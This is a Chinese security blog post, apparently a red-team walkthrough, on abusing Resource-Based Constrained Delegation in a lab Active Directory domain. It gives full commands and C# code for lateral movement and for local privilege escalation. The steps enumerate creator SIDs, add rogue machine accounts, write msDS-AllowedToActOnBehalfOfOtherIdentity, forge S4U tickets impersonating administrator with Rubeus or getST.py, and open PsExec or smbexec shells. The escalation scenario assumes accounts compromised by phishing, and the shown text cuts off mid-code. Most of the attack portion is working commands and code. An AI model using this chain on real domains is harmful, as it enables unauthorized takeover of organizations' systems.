<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 基于资源的约束委派 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="基于资源的约束委派 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">基于资源的约束委派</h1><div class="post-time">Aug 30, 2021</div><div class="post-content"><h3><span id="0x00-前言">0x00 前言</span></h3><p><strong>基于资源的约束委派(RBCD)</strong>是在 Windows Server 2012 中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD 把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。也就是说机器自身可以直接在自己账户上配置 msDS-AllowedToActOnBehalfOfOtherIdentity 属性来设置 RBCD。</p>
<p>那么<strong>谁有权限配置 msDS-AllowedToActOnBehalfOfOtherIdentity 属性</strong></p>
<ul>
<li>将机器加入域的账号，也就是 mS-DS-CreatorSID 属性中的账户</li>
<li>机器账户自身也可以修改</li>
</ul>
<p><strong>利用基于资源的约束委派(RBCD)需要2个条件：</strong></p>
<p><strong>1.拥有将域机器加入域的域用户的权限</strong>。（将机器加入域的域用户拥有修改该机器的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的权限。）</p>
<p><strong>2.一个任意服务账户或者一个机器账户</strong>（每一个域用户都可以添加 10 个机器账户，添加的机器账户默认会注册 spn 服务）</p>
<h3><span id="0x01-横向">0x01 横向</span></h3><h4><span id="11环境说明">1.1.环境说明</span></h4><table>
<thead>
<tr>
<th>主机</th>
<th>机器名</th>
<th>ip</th>
</tr>
</thead>
<tbody>
<tr>
<td>域控</td>
<td>dc.test.local</td>
<td>192.168.247.8</td>
</tr>
<tr>
<td>域内win10（已控）</td>
<td>win10.test.local</td>
<td>192.168.247.10</td>
</tr>
<tr>
<td>域内win2012（目标）</td>
<td>win2012.test.local</td>
<td>192.168.247.11</td>
</tr>
</tbody>
</table>
<h4><span id="12信息收集">1.2.信息收集</span></h4><ul>
<li><strong>通过 ADFind 查找将域机器拉入域的用户的 SID：</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=test,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369))&quot; cn mS-DS-CreatorSID</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628754987842-f5b382bd-0425-463e-b621-5f64efe08518.png" alt="img"></p>
<p>可以发现<code>WIN10</code>和<code>WIN2012</code>的<code>mS-DS-CreatorSID</code>值是相同的，说明他们是用的同一个域账号进行加域操作的。同时显示<code>mS-DS-CreatorSID</code>值为空说明他们是使用的域管账号进行加域操作的。</p>
<ul>
<li><strong>查看SID对应的域账号</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=test,DC=local&quot; -f &quot;(&amp;(objectsid=S-1-5-21-3289781467-4043238699-2345174683-2603))&quot; objectclass cn dn</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628754994261-5ec49e26-38de-4a4b-8600-c30f43da35de.png" alt="img"></p>
<p>发现对应的域账号即当前我们获取的域账号权限。</p>
<p>同样上面的信息收集可以通过一个程序一步到位，代码来自：<a href="https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw" target="_blank" rel="noopener">微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）</a></p>
<p>.NET 实现在域内查询计算机”mS-DS-CreatorSID”属性的工具</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.DirectoryServices;</span><br><span class="line"><span class="keyword">namespace</span> ConsoleApp9</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(<span class="built_in">string</span>[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            DirectoryEntry ldap_conn = <span class="keyword">new</span> DirectoryEntry(<span class="string">"LDAP://dc=test,dc=local"</span>);</span><br><span class="line">            DirectorySearcher search = <span class="keyword">new</span> DirectorySearcher(ldap_conn);</span><br><span class="line">            String query = <span class="string">"(&amp;(objectClass=computer))"</span>;<span class="comment">//查找计算机</span></span><br><span class="line">            search.Filter = query;</span><br><span class="line">            foreach (SearchResult r in search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                String mS_DS_CreatorSID=<span class="string">""</span>;</span><br><span class="line">                String computername = <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    computername = r.Properties[<span class="string">"dNSHostName"</span>][<span class="number">0</span>].ToString();</span><br><span class="line"></span><br><span class="line">                    mS_DS_CreatorSID = (<span class="keyword">new</span> SecurityIdentifier((byte[])r.Properties[<span class="string">"mS-DS-CreatorSID"</span>][<span class="number">0</span>], <span class="number">0</span>)).ToString();</span><br><span class="line">                    <span class="comment">//Console.WriteLine("&#123;0&#125; &#123;1&#125;\n", computername, mS_DS_CreatorSID);</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span></span><br><span class="line">                &#123;</span><br><span class="line">                    ;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//再通过sid找用户名</span></span><br><span class="line">                String UserQuery = <span class="string">"(&amp;(objectClass=user))"</span>;</span><br><span class="line">                DirectorySearcher search2 = <span class="keyword">new</span> DirectorySearcher(ldap_conn);</span><br><span class="line">                search2.Filter = UserQuery;</span><br><span class="line"></span><br><span class="line">                foreach (SearchResult u in search2.FindAll())</span><br><span class="line">                &#123;</span><br><span class="line">                    String user_sid = (<span class="keyword">new</span> SecurityIdentifier((byte[])u.Properties[<span class="string">"objectSid"</span>][<span class="number">0</span>], <span class="number">0</span>)).ToString();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (user_sid == mS_DS_CreatorSID) &#123;</span><br><span class="line">                        <span class="comment">//Console.WriteLine("debug");</span></span><br><span class="line">                        String username = u.Properties[<span class="string">"name"</span>][<span class="number">0</span>].ToString();</span><br><span class="line">                        Console.WriteLine(<span class="string">"[*] [&#123;0&#125;] -&gt; creator  [&#123;1&#125;]"</span>,computername, username);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就可以直接看到域内的主机是通过哪个域账号进行的加域操作。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755002519-f11b96f4-d5fb-42da-86e8-2d58bf76818d.png" alt="img"></p>
<h4><span id="13创建机器用户">1.3.创建机器用户</span></h4><p>默认域控的 ms-DS-MachineAccountQuota 属性设置允许所有域用户向一个域添加最多 10 个计算机账户；</p>
<p>同时使用域账户创建或加入域的机器账户自动注册 SPN 变为服务账户。</p>
<p>所以我们创建了一个机器用户就相当于拥有了服务账户。</p>
<ul>
<li><strong>Powermad</strong></li>
</ul>
<p>可以使用<a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener">Powermad</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\Users\adduser\Desktop\Powermad-master\Powermad-master\Powermad.ps1;New-MachineAccount -MachineAccount evilpc -Password $(ConvertTo-SecureString &quot;1qaz@WSX&quot; -AsPlainText -Force)&#125;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755008197-a1585daf-df4e-4036-9060-75e871ef8417.png" alt="img"></p>
<p>可以看到成功添加了机器用户<code>evilpc$</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q */*</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755013609-f99a29f9-b782-4e12-bfa1-34a2d2ddc350.png" alt="img"></p>
<p>同时注册了spn服务。</p>
<ul>
<li><strong>addcomputer.py</strong></li>
</ul>
<p>使用impacket套件中的addcomputer.py添加(无需在域内，只需要拥有一个域账号和网络通即可)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py -dc-ip 192.168.247.8 -computer-name evilpc2 -computer-pass 123456 &quot;test.local/adduser:1qaz@WSX&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755020135-10b69774-bce9-4159-95a8-a018670974bc.png" alt="img"></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755024656-42a8c733-b8b6-41ee-94e1-c5851b9ed459.png" alt="img"></p>
<h4><span id="14配置基于资源的约束委派">1.4.配置基于资源的约束委派</span></h4><h5><span id="powerviewps1empire">powerview.ps1(Empire)</span></h5><p><strong>查询添加机器的SID</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"&amp; &#123;Import-Module .\powerview.ps1;Get-DomainComputer -Identity evilpc -Properties objectsid&#125;"</span></span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755029875-4fbee3a8-c9be-47de-b95f-ddf8885363cc.png" alt="img"></p>
<p><strong>配置基于资源的约束委派</strong></p>
<p>修改SID为添加用户的SID，修改<code>Get-DomainComputer</code>后面跟目标主机名。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powerview.ps1</span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3289781467-4043238699-2345174683-2606)"</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"></span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Get-DomainComputer WIN2012| Set-DomainObject -Set @&#123;<span class="string">'msds-allowedtoactonbehalfofotheridentity'</span>=<span class="variable">$SDBytes</span>&#125; -Verbose</span><br></pre></td></tr></table></figure>
<p>在非交互的情况下可以将如下代码保存为 rbcd.ps1</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3289781467-4043238699-2345174683-2606)"</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\adduser\Desktop\powerview.ps1</span><br><span class="line">Get-DomainComputer WIN2012 | Set-DomainObject -Set @&#123;<span class="string">'msds-allowedtoactonbehalfofotheridentity'</span>=<span class="variable">$SDBytes</span>&#125; -Verbose</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy bypass -File ./rbcd.ps1</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755036362-9df3bf71-7ee5-457c-8264-212507112feb.png" alt="img"></p>
<p><strong>检查是否配置成功</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"&amp; &#123;Import-Module .\powerview.ps1;Get-DomainComputer WIN2012 -Properties msds-allowedtoactonbehalfofotheridentity&#125;"</span></span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755046389-cbe82ec0-406f-4267-b3bb-985b52312f2a.png" alt="img"></p>
<p><strong>攻击完成清除基于资源的约束委派配置：</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"&amp; &#123;Import-Module .\powerview.ps1;Set-DomainObject WIN2012 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose&#125;"</span></span><br></pre></td></tr></table></figure>
<h5><span id="rbcdpy">rbcd.py</span></h5><p><a href="https://github.com/tothi/rbcd-attack，依赖impacket，域外一步到位。" target="_blank" rel="noopener">https://github.com/tothi/rbcd-attack，依赖impacket，域外一步到位。</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 rbcd.py -f EVILPC2 -t WIN2012 -dc-ip 192.168.247.8 test\\adduser:1qaz@WSX</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755068536-c1d33310-e3ba-444f-9731-1569de09c3f0.png" alt="img"></p>
<h4><span id="15获取票据">1.5.获取票据</span></h4><h5><span id="rubeus142">Rubeus(1.4.2)</span></h5><p>Rubeus1.4.2需要依赖.net3.5。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /user:evilpc /password:1qaz@WSX /domain:test.local</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755081343-2432caf5-5fa9-4ca3-ad3b-e800f0c9d7e4.png" alt="img"></p>
<p>我尝试从网上下载Rubeus.exe2.0发现s4u失败了，1.4.2版本没问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:evilpc$ /rc4:161CFF084477FE596A5DB81874498A24 /impersonateuser:administrator /msdsspn:cifs/WIN2012 /ptt</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755117763-afce8d49-1aea-44ee-bb81-699854817239.png" alt="img"></p>
<p>再申请一个host服务的票据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:evilpc$ /rc4:161CFF084477FE596A5DB81874498A24 /impersonateuser:administrator /msdsspn:cifs/WIN2012 /ptt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\WIN2012 cmd.exe</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755124288-34f27c1c-e6e4-4f22-9b68-6c65379b3fe0.png" alt="img"></p>
<h5><span id="getstpy">getST.py</span></h5><p>在域外且有域账号的情况下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.247.8 -spn cifs/WIN2012.test.local -impersonate administrator test.local/evilpc2$:123456</span><br><span class="line">export KRB5CCNAME=`pwd`/administrator.ccache</span><br><span class="line">klist</span><br><span class="line">python3 smbexec.py -no-pass -k WIN2012.test.local</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755131472-3d83e48d-bf30-4251-8902-bf262ea70ebe.png" alt="img"></p>
<h3><span id="0x02-提权">0x02 提权</span></h3><h4><span id="21场景说明">2.1.场景说明</span></h4><p>在我们做社工钓鱼的时候经常会上线一些域账号，但是这些域用户没有在本地管理员组里面，我们是没有去抓密码啥的。所以就需要提权。</p>
<p><strong>前提条件：上线的域账号为该机器加入域用到的域账号</strong></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755135562-5fdaffd6-1904-4b40-a7a1-530cd5dbca5a.png" alt="img"></p>
<h4><span id="22利用rbcd进行提权">2.2.利用RBCD进行提权</span></h4><p>这里就利用RBCD进行提权，可以用以下代码实现 RBCD 创建机器账户和配置基于资源的约束委派的全过程。</p>
<p>代码来自：<a href="https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw" target="_blank" rel="noopener">微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Security.AccessControl;</span><br><span class="line"><span class="keyword">using</span> System.S	ecurity.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.DirectoryServices;</span><br><span class="line"><span class="keyword">namespace</span> Addnew_MachineAccount</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(<span class="built_in">string</span>[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            String DomainController = <span class="string">"192.168.247.8"</span>;</span><br><span class="line">            String Domain = <span class="string">"test.local"</span>;</span><br><span class="line">            String new_MachineAccount = <span class="string">"testpc1"</span>; <span class="comment">//添加的机器账户</span></span><br><span class="line">            String new_MachineAccount_password = <span class="string">"123456"</span>; <span class="comment">//机器账户密码</span></span><br><span class="line">            String victimcomputer = <span class="string">"WIN10"</span>; <span class="comment">//需要进行提权的机器</span></span><br><span class="line">            String victimcomputer_ldap_path = <span class="string">"LDAP://CN=WIN10,CN=Computers,DC=test,DC=local"</span>;</span><br><span class="line">            String machine_account = new_MachineAccount;</span><br><span class="line">            String sam_account = machine_account + <span class="string">"$"</span>;</span><br><span class="line"></span><br><span class="line">            String distinguished_name = <span class="string">""</span>;</span><br><span class="line">            String[] DC_array = null;</span><br><span class="line">            distinguished_name = <span class="string">"CN="</span> + machine_account + <span class="string">",CN=Computers"</span>;</span><br><span class="line">            DC_array = Domain.Split(<span class="string">'.'</span>);</span><br><span class="line">            foreach (String DC in DC_array)</span><br><span class="line">            &#123;</span><br><span class="line">                distinguished_name += <span class="string">",DC="</span> + DC;</span><br><span class="line">            &#125;</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Elevate permissions on "</span> + victimcomputer);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Domain = "</span> + Domain);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Domain Controller = "</span> + DomainController);</span><br><span class="line">            <span class="comment">//Console.WriteLine("[+] New SAMAccountName = " + sam_account);</span></span><br><span class="line">            <span class="comment">//Console.WriteLine("[+] Distinguished Name = " + distinguished_name);</span></span><br><span class="line">            <span class="comment">//连接ldap</span></span><br><span class="line">            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = <span class="keyword">new</span> System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, <span class="number">389</span>);</span><br><span class="line">            <span class="comment">//NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录</span></span><br><span class="line">            System.DirectoryServices.Protocols.LdapConnection connection = null;</span><br><span class="line">            <span class="comment">//connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);</span></span><br><span class="line">            connection = <span class="keyword">new</span> System.DirectoryServices.Protocols.LdapConnection(identifier);</span><br><span class="line">            connection.SessionOptions.Sealing = <span class="literal">true</span>;</span><br><span class="line">            connection.SessionOptions.Signing = <span class="literal">true</span>;</span><br><span class="line">            connection.Bind();</span><br><span class="line">            var request = <span class="keyword">new</span> System.DirectoryServices.Protocols.AddRequest(distinguished_name, <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute[] &#123;</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"DnsHostName"</span>, machine_account +<span class="string">"."</span>+ Domain),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"SamAccountName"</span>, sam_account),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"userAccountControl"</span>, <span class="string">"4096"</span>),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"unicodePwd"</span>, Encoding.Unicode.GetBytes(<span class="string">"\""</span> + new_MachineAccount_password + <span class="string">"\""</span>)),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"objectClass"</span>, <span class="string">"Computer"</span>),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"ServicePrincipalName"</span>, <span class="string">"HOST/"</span>+machine_account+<span class="string">"."</span>+Domain,<span class="string">"RestrictedKrbHost/"</span>+machine_account+<span class="string">"."</span>+Domain,<span class="string">"HOST/"</span>+machine_account,<span class="string">"RestrictedKrbHost/"</span>+machine_account)</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//添加机器账户</span></span><br><span class="line">                connection.SendRequest(request);</span><br><span class="line">                Console.WriteLine(<span class="string">"[+] Machine account: "</span> + machine_account + <span class="string">" Password: "</span> + new_MachineAccount_password + <span class="string">" added"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">"[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)"</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">"[-] Exception: "</span> + ex.Message);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 获取新计算机对象的SID</span></span><br><span class="line">            var new_request = <span class="keyword">new</span> System.DirectoryServices.Protocols.SearchRequest(distinguished_name, <span class="string">"(&amp;(samAccountType=805306369)(|(name="</span> + machine_account + <span class="string">")))"</span>, System.DirectoryServices.Protocols.SearchScope.Subtree, null);</span><br><span class="line">            var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);</span><br><span class="line">            SecurityIdentifier sid = null;</span><br><span class="line">            foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    sid = <span class="keyword">new</span> SecurityIdentifier(entry.Attributes[<span class="string">"objectsid"</span>][<span class="number">0</span>] as byte[], <span class="number">0</span>);</span><br><span class="line">                    Console.Out.WriteLine(<span class="string">"[+] "</span> + new_MachineAccount + <span class="string">" SID : "</span> + sid.Value);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"[!] It was not possible to retrieve the SID.\nExiting..."</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//设置资源约束委派</span></span><br><span class="line">            System.DirectoryServices.DirectoryEntry myldapConnection = <span class="keyword">new</span> System.DirectoryServices.DirectoryEntry(<span class="string">"test.local"</span>);</span><br><span class="line">            myldapConnection.Path = victimcomputer_ldap_path;</span><br><span class="line">            